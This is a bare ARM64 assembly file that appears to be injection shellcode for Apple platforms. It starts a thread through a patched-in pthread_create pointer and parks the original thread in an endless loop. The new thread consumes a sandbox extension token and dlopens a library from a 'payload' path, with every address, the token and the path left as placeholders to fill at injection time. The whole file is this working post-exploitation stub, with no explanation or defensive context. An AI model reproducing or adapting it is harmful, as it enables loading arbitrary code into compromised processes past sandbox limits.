        .text
        .align 4
        .global _start

_start:
        sub sp, sp, #0x30
        stp x29, x30, [sp, #0x20]
        add x29, sp, #0x20

        stur w0, [x29, #-0x4]
        str x1, [sp, #0x10]

        add x0, sp, #0x8
        mov x8, #0
        str x8, [sp, #0x8]
        mov x1, x8
        adr x2, thread_func
        paciza x2
        mov x3, x8

        adr x9, _pthread_create_addr
        ldr x9, [x9]
        blr x9

        // 0x79616265 ('yabe')
        movz x0, #0x6265
        movk x0, #0x7961, lsl #16

        adr x9, loop_here
loop_here:
        br x9

        ldp x29, x30, [sp, #0x20]
        add sp, sp, #0x30
        ret

        .align 3
_pthread_create_addr:
        .quad 0x0

        .align 4
thread_func:
        pacibsp
        sub sp, sp, #0x30
        stp x29, x30, [sp, #0x20]
        add x29, sp, #0x20

        stur w0, [x29, #-0x4]
        str x1, [sp, #0x10]

        adr x0, _sandbox_token
        adr x9, _sandbox_consume_addr
        ldr x9, [x9]
        blr x9

        mov x1, #1
        adr x0, _payload_path
        adr x9, _dlopen_addr
        ldr x9, [x9]
        blr x9

        ldp x29, x30, [sp, #0x20]
        add sp, sp, #0x30
        retab

        .align 3
_sandbox_consume_addr:
        .quad 0x0

_dlopen_addr:
        .quad 0x0

        .align 3
_payload_path:
        .space 128, 0

        .align 3
_sandbox_token:
        .space 256, 0
